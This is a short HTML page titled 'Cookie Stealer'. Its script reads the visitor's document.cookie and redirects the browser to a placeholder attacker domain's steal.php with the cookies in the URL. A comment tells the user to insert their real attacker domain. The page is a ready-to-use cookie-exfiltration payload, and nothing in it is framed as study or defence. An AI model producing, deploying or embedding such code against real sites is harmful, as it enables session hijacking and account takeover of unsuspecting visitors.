<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cookie Stealer</title>
</head>
<body>
    <h1>Cookie Stealer</h1>
    <p>Your cookies have been stolen!</p>
    <script>
        // Replace 'your-attacker-domain.com' with your actual attacker domain
        var attackerDomain = 'http://your-attacker-domain.com';
        var cookie = document.cookie;
        window.location.href = attackerDomain + '/steal.php?cookie=' + encodeURIComponent(cookie);
    </script>
</body>
</html>
